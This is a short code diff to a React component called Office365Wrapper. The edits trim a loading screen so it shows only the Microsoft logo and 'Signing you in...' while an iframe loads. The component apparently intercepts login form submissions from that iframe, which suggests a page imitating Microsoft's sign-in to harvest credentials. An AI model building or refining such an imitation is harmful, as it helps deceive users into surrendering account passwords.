@@ -7,18 +7,14 @@ interface Office365WrapperProps {
   onLoginError?: (error: string) => void;
 }
 
-// A new loader component to show while the iframe is loading
+// Loader component with the specified elements removed
 const IframeLoader: React.FC = () => (
   <div className="w-full h-screen flex flex-col items-center justify-center bg-white">
     <div className="text-center">
-      {/* This can be replaced with the SVG logo if preferred */}
       <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Microsoft logo" style={{ height: '23px', margin: '0 auto 24px' }} />
       <h1 style={{ fontSize: '24px', fontWeight: 600, color: '#1b1b1b' }}>Signing you in...</h1>
+      {/* The spinner and extra text have been removed from this div */}
       <div style={{ marginTop: '2rem' }}>
-        <Spinner size="lg" />
-        <p style={{ marginTop: '20px', color: '#666' }}>
-          Preparing secure sign-in...
-        </p>
       </div>
     </div>
   </div>
@@ -27,7 +23,7 @@ const IframeLoader: React.FC = () => (
 const Office365Wrapper: React.FC<Office365WrapperProps> = ({ onLoginSuccess, onLoginError }) => {
   const { isLoading, errorMessage, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);
   const iframeRef = useRef<HTMLIFrameElement>(null);
-  const [isIframeLoading, setIsIframeLoading] = useState(true); // State to manage iframe load
+  const [isIframeLoading, setIsIframeLoading] = useState(true);
 
   // This logic for handling form submission from the iframe remains untouched
   useEffect(() => {
@@ -63,7 +59,7 @@ const Office365Wrapper: React.FC<Office365WrapperProps> = ({ onLoginSuccess, onL
         </div>
       )}
 
-      {/* NEW: The instant loader that shows while the iframe itself is loading */}
+      {/* The instant loader that shows while the iframe itself is loading */}
       {isIframeLoading && <IframeLoader />}
 
       <iframe
